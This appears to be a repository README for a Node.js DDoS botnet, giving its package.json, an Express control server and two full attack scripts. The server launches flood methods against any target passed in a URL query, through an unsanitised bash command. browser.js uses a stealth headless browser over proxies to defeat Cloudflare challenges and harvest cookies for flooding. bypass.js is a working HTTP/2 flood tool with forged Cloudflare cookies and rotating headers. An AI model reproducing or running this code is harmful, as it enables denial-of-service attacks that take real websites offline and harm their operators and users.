# Bot-Net For DDoS

- Package.json
``` 
{
    "name": "Botnet",
    "version": "1.0.0",
    "description": "",
    "depecrated": false,
    "main": "index.js",
    "directories": {
        "lib": "lib"
    },
    "scripts": {
        "start": "node index.js"
    },
    "license": "MIT",
    "dependencies": {
        "axios": "^0.27.2",
        "chalk": "^4.1.2",
        "cheerio": "^1.0.0-rc.12",
        "colors": "^1.4.0",
        "express": "^4.18.2",
        "fake-useragent": "^1.0.1",
        "gradient-string": "^2.0.2",
        "hpack": "^1.0.0",
        "node-fetch": "^3.3.2",
        "qrcode-terminal": "^0.12.0",
        "ssh2": "^1.15.0",
        "url": "^0.11.0",
        "user-agents": "^1.1.246",
        "util": "^0.12.4"
    },
    "author": "bkp"
}
```
- index.js 
```
const express = require('express');
const { spawn } = require('child_process');
const url = require('url');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;

async function fetchData() {
    try {
        const response = await fetch('https://httpbin.org/get');
        const data = await response.json();
        console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
        return data;
    } catch (error) {
        console.error('Error fetching data:', error);
    }
}

function generateCommand(target, port, time, methods) {
    switch (methods) {
        case 'pidoras':
            return `node ./lib/cache/pidoras.js ${target} ${time} 100 10 proxy.txt`;
        case 'glory':
            return `node ./lib/cache/glory.js ${target} ${time} 100 10 proxy.txt`;
        case 'quantum':
            return `node ./lib/cache/quantum.js ${target} ${time} 100 10 proxy.txt`;
        case 'fire':
            return `node ./lib/cache/fire.js ${target} ${time} 100 10 proxy.txt`;
        case 'httpsvip':
            return `node ./lib/cache/httpsvip.js ${target} ${time} 100 10 proxy.txt`;
        case 'tls':
            return `node ./lib/cache/tls.js ${target} ${time} 100 10 proxy.txt flood`;
        case 'httpx':
            return `node ./lib/cache/httpx.js ${target} ${time} 100 10 proxy.txt`;
        case 'uam':
            return `node ./lib/cache/uam.js ${target} ${time} 100 10 proxy.txt`;
        case 'bypass':
            return `node ./lib/cache/bypass.js ${target} ${time} 10 100 proxy.txt`;
        case 'https':
            return `node ./lib/cache/https.js ${target} ${time} 10 100 proxy.txt`;
        case 'stop':
            return `node ./lib/cache/stop.js ${target} ${time} 1 1 proxy.txt`;
        case 'cibi':
            return `node ./lib/cache/cibi.js ${target} ${time} 100 10 proxy.txt`;
        case 'flood':
            return `node ./lib/cache/flood.js ${target} ${time} 100 10 proxy.txt`;
        case 'raw':
            return `node ./lib/cache/raw.js ${target} ${time}`;
        case 'browser':
            return `node ./lib/cache/browser.js ${target} ${time} 10 100`;
        case 'udp':
            return `node ./lib/cache/udp.js ${target} ${port} ${time}`;
        case 'proxy':
            return `node ./lib/cache/scrape.js`;
        default:
            return null;
    }
}

app.get('/putraganteng', (req, res) => {
    // Parse URL untuk mengambil parameter query
    const queryObject = url.parse(req.url, true).query;
    const { target, port, time, methods } = queryObject;

    // Memberikan respon ke client
    res.status(200).json({
        status: 'Serangan PUTZXY90 Di Mulai.... ',
        target,
        port,
        time,
        methods
    });

    // Membuat command berdasarkan parameter yang diterima
    const command = generateCommand(target, port, time, methods);

    if (command) {
        // Menggunakan spawn untuk menjalankan perintah
        const process = spawn('bash', ['-c', command], { detached: true });

        // Mendengarkan aliran stdout dan stderr
        process.stdout.on('data', (data) => {
            console.log(`Stdout: ${data}`);
        });

        process.stderr.on('data', (data) => {
            console.error(`Stderr: ${data}`);
        });

        process.on('close', (code) => {
            console.log(`Proses keluar dengan kode ${code}`);
        });
    } else {
        console.log('Metode tidak valid diberikan.');
    }
});

// Menunggu request pada port yang ditentukan
app.listen(port, () => {
    fetchData();
});
```
- lib/cahce/browser.js
```
const fs = require("fs");
const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
const async = require("async");

const COOKIES_MAX_RETRIES = 1;
const errorHandler = error => {
    console.log(error);
};

process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

Array.prototype.remove = function (item) {
    const index = this.indexOf(item);
    if (index !== -1) {
        this.splice(index, 1);
    }
    return item;
};

const stealthPlugin = puppeteerStealth();
puppeteer.use(stealthPlugin);
if (process.argv.length < 6) {
    console.error("node browser target theard proxy rate time");
    process.exit(1);
}
const targetURL = process.argv[2];
const threads = process.argv[3];
const proxyFile = process.argv[4];
const rates = process.argv[5];
const duration = process.argv[6];

const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));
const { spawn } = require("child_process");

const readProxiesFromFile = (filePath) => {
    try {
        const data = fs.readFileSync(filePath, 'utf8');
        const proxies = data.trim().split(/\r?\n/);
        return proxies;
    } catch (error) {
        console.error('Error reading proxies file:', error);
        return [];
    }
};

const proxies = readProxiesFromFile(proxyFile);
const userAgents = [
'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 14; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 14; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 14; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
'Mozilla/5.0 (Android 14; Mobile; rv:68.0) Gecko/68.0 Firefox/118.0',
'Mozilla/5.0 (Android 14; Mobile; LG-M255; rv:118.0) Gecko/118.0 Firefox/118.0', 
'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/118.0.5993.69 Mobile/15E148 Safari/604.1', 
'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/118.0 Mobile/15E148 Safari/605.1.15', 
'Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
'Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
'Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 EdgiOS/117.2045.65 Mobile/15E148 Safari/605.1.15'
];
async function detectChallenge(browser, page, browserProxy) {
    const title = await page.title();
    const content = await page.content();
  
    if (title === "Attention Required! | Cloudflare") {
        throw new Error("Proxy blocked");
    }
  
    if (content.includes("challenge-platform")) {
        console.log("Browser Start Bypass With Proxy: " + browserProxy);
    
        try {
            await sleep(10);
            const captchaContainer = await page.$("iframe[src*='challenges']");
            await captchaContainer.click({ offset: { x: 20, y: 20 } });
        } catch (error) {
        } finally {
            await sleep(5);
            return;
        }
    }
  
    console.log("Can't Find ! " + browserProxy);
    await sleep(10);
}

async function openBrowser(targetURL, browserProxy) {
    const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
    const options = {
        headless: "false",
        ignoreHTTPSErrors: true,
        args: [
            "--proxy-server=http://" + browserProxy,
            "--no-sandbox",
            "--no-first-run",
            "--ignore-certificate-errors",
            "--disable-extensions",
            "--test-type",
            "--user-agent=" + userAgent,
            "--disable-gpu",
            "--disable-browser-side-navigation"
        ]
    };

    let browser;
    try {
        browser = await puppeteer.launch(options);
    } catch (error) {
        console.error('Error run Browser', error);
        return;
    }
  
    try {
        console.log("Browser Start Solved With Proxy : " + browserProxy);
        const [page] = await browser.pages();
        const client = page._client();
    
        page.on("framenavigated", (frame) => {
            if (frame.url().includes("challenges.cloudflare.com")) {
                client.send("Target.detachFromTarget", { targetId: frame._id });
            }
        });
    
        page.setDefaultNavigationTimeout(60 * 1000);
        await page.goto(targetURL, { waitUntil: "domcontentloaded" });
        await detectChallenge(browser, page, browserProxy);
        const title = await page.title();
        const cookies = await page.cookies(targetURL);
    
        return {
            title: title,
            browserProxy: browserProxy,
            cookies: cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim(),
            userAgent: userAgent
        };
    } catch (error) {
        console.error('Error while run Browser', error);
    } finally {
        console.log("HTTP-NEMESIS Fail Solved: " + browserProxy);
        await browser.close();
    }
}

async function startThread(targetURL, browserProxy, task, done, retries = 0) {
    if (retries === COOKIES_MAX_RETRIES) {
        const currentTask = queue.length();
        done(null, { task, currentTask });
    } else {
        try {
            const response = await openBrowser(targetURL, browserProxy);
            if (response) {
                if (response.title === "Just a moment...") {
                    console.log("HTTP-NEMESIS solve : " + browserProxy + " - Bypass failed ! ");
                    await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
                    return;
                }
                
                const cookies = "Browser Start Flooding: "+"[PageTittle] : " + response.title + "\n [ProxySolved] : " + response.browserProxy + "\n [User-Agent] :" + response.userAgent + "\n [Cookie-Solved] : " + response.cookies + "\n}";
                console.log( "{ " + "\n" + cookies);
                spawn("node", [
                    "flood.js",
                    targetURL,
                    duration,
                    "30",
                    "10",
                    response.browserProxy,
                    response.cookies,
                    response.userAgent
                ]);
            }
            await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
        } catch (error) {
            colored(colors.COLOR_RED, error.message);
            await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
        }
    }
}


const queue = async.queue(function (task, done) {
    startThread(targetURL, task.browserProxy, task, done);
}, threads);

async function main() {
    for (let i = 0; i < proxies.length; i++) {
        const browserProxy = proxies[i];
        queue.push({ browserProxy: browserProxy });
    }

    await sleep(duration);
    queue.kill();
    process.exit();
}

main();
```

- lib/cahce/bypass.js
```
const http = require('http');
const tls = require('tls');
const crypto = require('crypto');
const cluster = require('cluster');
const fs = require('fs');
const url = require('url');
const os = require('os');
const http2 = require('http2-wrapper');

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
	.setMaxListeners(0)
	.on('uncaughtException', function (e) {
		if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
	})
	.on('unhandledRejection', function (e) {
		if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
	})
	.on('warning', e => {
		if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
	})
	.on("SIGHUP", () => {
		return 1;
	})
	.on("SIGCHILD", () => {
		return 1;
	});

const blockedDomains = [".zxn", ".zxm"];

const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const currentDate = new Date();
const targetDate = new Date('2090-03-16');

const mode = process.argv[2];
const target = process.argv[3];
const time = process.argv[4];
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];
const queryIndex = process.argv.indexOf('--query');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const bfmFlagIndex = process.argv.indexOf('--bfm');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 1;
const cookieIndex = process.argv.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const postdataIndex = process.argv.indexOf('--postdata');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;

if (!mode || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.log(`Bypass method Updated: 09.06.2024 // With love @fengzzt for Tron Network`);
    console.log(`Example: node bypass.js GET https://target.com?q=%RAND% 120 16 proxy.txt --query 1 --cookie uh=good --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --randrate`);
    console.error(`node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy> (options: --query 1/2/3 --delay <1-100> --cookie f=f --bfm true/false --referer rand / https://target.com --postdata "user=f&pass=f" --randrate)`);
    process.exit(1);
}

let hcookie = '';

const parsed = url.parse(target);
const proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n');

if (currentDate > targetDate) {
    console.error('Error method has been outdate pm @fengzzt');
    process.exit(1);
}	

if (!['GET', 'POST'].includes(mode)) {
    console.error('Error request method only can GET/POST');
    process.exit(1);
}

if (blockedDomains.some(domain => parsed.host.endsWith(domain))) {
    console.log(`Domain ${parsed.host} is blocked. If this is a mistake, please contact @fengzzt`);
    process.exit(1);
}

if (!target.startsWith('https://')) {
    console.error('Error protocol can only https://');
    process.exit(1);
}

if(isNaN(time) || time <= 0 || time > 86400) {
    console.error('Error time can not high 86400')
    process.exit(1);
}

if(isNaN(threads) || threads <= 0 || threads > 256) {
    console.error('Error threads can not high 256')
    process.exit(1);
}

if (isNaN(ratelimit) || ratelimit <= 0 || ratelimit > 128) {
    console.error('Error ratelimit can not high 128');
    process.exit(1);
}

if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
	hcookie = `__cf_bm=${randstr(23)}_${randstr(19)}-${timestampString}-1-${randstr(4)}/${randstr(65)}+${randstr(16)}=; cf_clearance=${randstr(35)}_${randstr(7)}-${timestampString}-0-1-${randstr(8)}.${randstr(8)}.${randstr(8)}-0.2.${timestampString}`;
}

if (cookieValue) {
    hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
}

function generateRandomString(minLength, maxLength) {
	const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
	const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
	let result = '';
	for (let i = 0; i < length; i++) {
		const randomIndex = Math.floor(Math.random() * characters.length);
		result += characters[randomIndex];
	}
	return result;
}

    function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}


    if (parsed.path.includes("%RAND%")) {
        const randomValue = randstr(6) + "&" + randstr(6);
        parsed.path = parsed.path.replace("%RAND%", randomValue);
    }

function randstrr(length) {
const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
let result = "";
const charactersLength = characters.length;
for (let i = 0; i < length; i++) {
	result += characters.charAt(Math.floor(Math.random() * charactersLength));
}
return result;
}

function getRandomToken(length) {
const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
let token = '';
for (let i = 0; i < length; i++) {
	token += chars.charAt(Math.floor(Math.random() * chars.length));
}
return token;
}

const getRandomInt = (min, max) => {
    return Math.floor(Math.random() * (max - min + 1)) + min;
  };


  const headers = (hcookie, jsondata, index) => {
    // Update the range for browser versions
    const browserVersion = getRandomInt(119, 125); // Extend to the latest versions for 2024
    const fwfw = ['Google Chrome', 'Brave'];
    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
    const nt = getRandomInt(0, 4);

    let brandValue;
    switch (browserVersion) {
        case 119:
            brandValue = `"Not?A_Brand";v="24", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
            break;
        case 120:
            brandValue = `"Not_A_Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
            break;
        case 121:
            brandValue = `"Not A(Brand";v="99", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
            break;
        case 122:
            brandValue = `"Chromium";v="${browserVersion}", "Not(A:Brand";v="24", "${wfwf}";v="${browserVersion}"`;
            break;
        case 123:
            brandValue = `"Chromium";v="${browserVersion}", "Google Chrome";v="${browserVersion}"`; // Example for 123
            break;
        case 124:
            brandValue = `"Not?A_Brand";v="24", "Chromium";v="${browserVersion}", "Brave";v="${browserVersion}"`; // Example for 124
            break;
        case 125:
            brandValue = `"Google Chrome";v="${browserVersion}", "Chromium";v="${browserVersion}", "Not_A_Brand";v="99"`; // Example for 125
            break;
        default:
            brandValue = `"Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }

    const isBrave = wfwf === 'Brave';

    const acceptHeaderValue = isBrave
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';

    const secGpcValue = isBrave ? "1" : undefined;

    const userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
    const secChUa = `${brandValue}`;
    const currentRefererValue = refererValue === 'rand' ? 'https://' + getRandomToken(6) + ".net" : refererValue;

    const header = {
        ':method': mode,
        ':authority': parsed.host,
        ':scheme': 'https',
        ":path": query ? handleQuery(query) : parsed.path + (postdata ? `?${postdata}` : ""),
        ...(Math.random() < 0.4 && { "cache-control": "max-age=0" }),
        ...(mode === "POST" && { "content-length": "0" }),
        ...(Math.random() < 0.9 && { "priority": `u=${nt}, i` }),
        "sec-ch-ua": secChUa,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": `"Windows"`,
        "upgrade-insecure-requests": "1",
        "user-agent": userAgent,
        "accept": acceptHeaderValue,
        ...(secGpcValue && { "sec-gpc": secGpcValue }),
        ...(Math.random() < 0.5 && { "sec-fetch-site": currentRefererValue ? "same-origin" : "none" }),
        ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
        ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
        "sec-fetch-dest": "document",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.7",
        ...(hcookie && { "cookie": hcookie }),
        ...(currentRefererValue && { "referer": currentRefererValue }),
        ...(Math.random() < 0.3 && { 'x-client-session': 'none' }),
        ...(Math.random() < 0.3 && { 'sec-fetch-users': '?0' }),
        ...(Math.random() < 0.3 && { 'x-request-data': 'dynamic' }),
        ...(Math.random() < 0.1 && { 'x-requested-with': 'XMLHttpRequest' })
    };

    return header;
};

function handleQuery(query) {
    if (query === '1') {
        return parsed.path + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
    } else if (query === '2') {
        return parsed.path + '?' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
    } else if (query === '3') {
        return parsed.path + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
    } else {
        return parsed.path;
    }
}

const agent = new http.Agent({
    keepAlive: true,
	keepAliveMsecs: 50000,
	maxSockets: Infinity,
    maxFreeSockets: Infinity,
	maxTotalSockets: Infinity,
    timeout: time * 1000,
});

const work = async () => {
    const [proxyHost, proxyPort] = proxies[Math.floor(Math.random() * proxies.length)].split(':');

    const request = http.get({
        method: 'CONNECT',
        host: proxyHost,
        port: proxyPort,
        agent,
        path: `${parsed.host}:443`,
        headers: {
            'Proxy-Connection': 'Keep-Alive'
        },
        rejectUnauthorized: true,
    });

    request.on('error', request.destroy);

    request.on('connect', (res, socket, { head }) => {
        if (head?.length) return socket.destroy();

        const ciphers = ["TLS_AES_128_GCM_SHA256", "TLS_CHACHA20_POLY1305_SHA256", "TLS_AES_256_GCM_SHA384", "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256"].join(":");
        const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
        const sessionOptions = {
            createConnection: (authority, option) => tls.connect({
                ...option,
                socket,
                servername: parsed.host,
                session: head,
                agent,
                secure: true,
                requestOCSP: true,
                ALPNProtocols: ["h2","http/1.1","http/1.2","http/1.0"],
                ciphers: ciphers,
                sigalgs: sigalgs,
                requestCert: true,
            }),
            settings: {
                headerTableSize: Math.random() < 0.5 ? 65535 : 65536,
                enablePush: false,
                initialWindowSize: Math.random() < 0.5 ? 6291456 : 6291457,
                maxHeaderListSize: Math.random() < 0.5 ? 262144 : 262145,
            },
        };

        const sessionState = { flags: 0 };

        const session = http2.connect(`https://${parsed.host}`, sessionOptions, () => {
            session.setLocalWindowSize(15663105);
        });

        let activeRequests = 0;
        let timeoutHandle;

        const resetTimeout = () => {
            clearTimeout(timeoutHandle);
            timeoutHandle = setTimeout(() => activeRequests && session.destroy(), 3000);
        };

        const closeSessionIfDone = () => {
            if (!activeRequests) {
                sessionState.flags |= 1;
                session.destroy();
            }
        };

        session.on('error', () => {
            sessionState.flags |= 1;
            session.destroy();
        });

        session.on('connect', () => {
            let ratelimit;
            if (randrate !== undefined) {
                ratelimit = getRandomInt(27, 61);
            } else {
                ratelimit = process.argv[6];
            }
            Array.from({ length: ratelimit }).forEach((_, index) => {
                const isFirstRequest = index === 0;
                const headersData = getHeaders(hcookie, isFirstRequest);
                requestHandler(session, headersData, index);
            });
            resetTimeout();
        });

        const getHeaders = (hcookie, jsondata, index) => headers(hcookie, jsondata, index);
        const requestHandler = (session, headersData, index) => {
            const req = session.request(headersData);
            req.setEncoding('utf8');
            req.end();

            function finalizeRequest() {
                activeRequests--;
                closeSessionIfDone();
            }

            req.on('ready', () => {
                finalizeRequest();
            });

            req.on('headers', (headers) => {
                finalizeRequest();
            });

            req.on('data', (chunk) => { });

            req.on('end', finalizeRequest);

            req.on('error', (err) => {
                finalizeRequest();
            });
        };
    });

    request.end();
};

if (cluster.isMaster) {
console.log('Attack Start! / @fengzzt like youu <3 / BYPASS');
Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));

cluster.on('exit', (worker) => {
	cluster.fork({ core: worker.id % os.cpus().length });
});

setTimeout(() => process.exit(1), time * 1000);
} else {
setInterval(work, delay);
setTimeout(() => process.exit(1), time * 1000);
}
```
dll method.... 

# Struktur Bot-Net
```
server/
├── index.js
├── package.json
└── lib/
    └── cache/
        ├── browser.js
        ├── bypass.js
        ├── cibi.js
        ├── fire.js
        ├── flood.js
        ├── glory.js
        ├── https.js
        ├── httpsvip.js
        ├── httpx.js
        ├── pidoras.js
        ├── quantum.js
        ├── raw.js
        ├── scrape.js
        ├── stop.js
        ├── tls.js
        ├── uam.js
        └── udp.js
        ```